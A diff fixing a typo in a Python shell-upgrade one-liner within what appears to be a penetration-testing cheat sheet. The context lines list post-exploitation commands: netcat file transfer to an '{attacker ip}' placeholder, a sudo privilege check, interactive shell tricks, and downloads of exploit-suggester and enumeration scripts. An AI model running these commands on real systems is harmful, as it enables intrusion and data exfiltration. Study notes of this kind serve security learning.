@@ -40,7 +40,7 @@
 * `nc -w 3 {attacker ip} {port} < {filename}` _Send file with netcat_
 * `nc -l -p {listen port} > {filename}` _Receive file with netcat_
 * `sudo -l` _Show commands that can be run as sudo_
-* `python -c 'import pty:pty.spawn("/bin/bash")'` _Get a better shell in netcat_
+* `python -c 'import pty;pty.spawn("/bin/bash")'` _Get a better shell in netcat_
 * `CTRZ + z -- stty raw -echo  -- fg` _Make netcat python shell interactive.  You won't see fg when it's typed.  Just hit enter._
 * `wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl` _Download exploit suggester_
 * `wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh` _Download linux enumeration script_
